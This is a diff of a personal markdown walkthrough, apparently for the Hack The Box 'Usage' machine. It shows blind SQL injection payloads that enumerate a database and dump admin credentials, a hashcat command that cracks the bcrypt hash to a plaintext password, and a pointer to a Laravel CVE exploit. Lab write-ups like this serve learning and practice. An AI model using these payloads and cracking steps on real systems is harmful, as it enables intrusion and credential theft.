@@ -142,13 +142,39 @@ Database name: `usage_blog`
 - now we can modify the script to get the value we want, for example lets list the tables of this data base `1' or substring((SELECT GROUP_CONCAT(TABLE_NAME SEPARATOR ',') FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA = 'usage_blog'),1,1) = 'a' -- -`
 >[!example]- Result
 >![[Pasted image 20250320184858.png]]
+>![[Pasted image 20250321222758.png]]
 
-![[Pasted image 20250321222758.png]]
-
->[!info]- Check the number of result of a request, for example, the number of tables
+>[!info]- Check the number of result of a record, for example, the number of tables
 >```sql
 >1' or (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema='usage_blog')=15 -- -
 >```
 
-- Now getting the name of the column of a table, `1' OR SUBSTRING( (SELECT GROUP_CONCAT(COLUMN_NAME SEPARATOR ',') FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA = 'usage_blog' AND TABLE_NAME = 'admin_menu' ), 1, 1 ) = 'a' -- -`
-![[Pasted image 20250321222729.png]]
+- Now getting the name of the column of a table, `1' OR SUBSTRING( (SELECT GROUP_CONCAT(COLUMN_NAME SEPARATOR ',') FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA = 'usage_blog' AND TABLE_NAME = 'admin_users' ), %d, 1 ) = '%s' -- -`
+
+>[!example]- Result
+>![[Pasted image 20250323113427.png]]
+
+- perfect we have to just enumerate the rows of this columns: `1' or substring((select group_concat(username,':',password separator ', ') from usage_blog.admin_users),%d,1) = '%s'`
+
+creds: `admin:$2y$10$ohq2klpbh/ri.p5wr0p3uomc24ydvl9da9h1s6ooomgh5xvfuprl2`
+
+- lets try to brute force the password using hashcat on mode "3200" or using [hashes.com](https://hashes.com)
+```bash
+.\hashcat.exe -m 3200 .\adminHash .\xato-net-10-million-passwords.txt -w 3
+```
+>[!example]- Result
+>![[Pasted image 20250323120701.png]]
+>![[Pasted image 20250323120915.png]]
+
+decrypted: `admin:whatever1`
+
+- And now we can login at `admin.usage.htb`
+>[!example]- Result
+>![[Pasted image 20250323121106.png]]
+
+# Enumeration 2
+- At dashboard we can see the used versions
+>[!example]- result
+>![[Pasted image 20250323121407.png]]
+
+- If we research we can find a exploit for this version of laravel "10.18.0", [CVE-2021-3129](https://github.com/joshuavanderpoll/CVE-2021-3129)
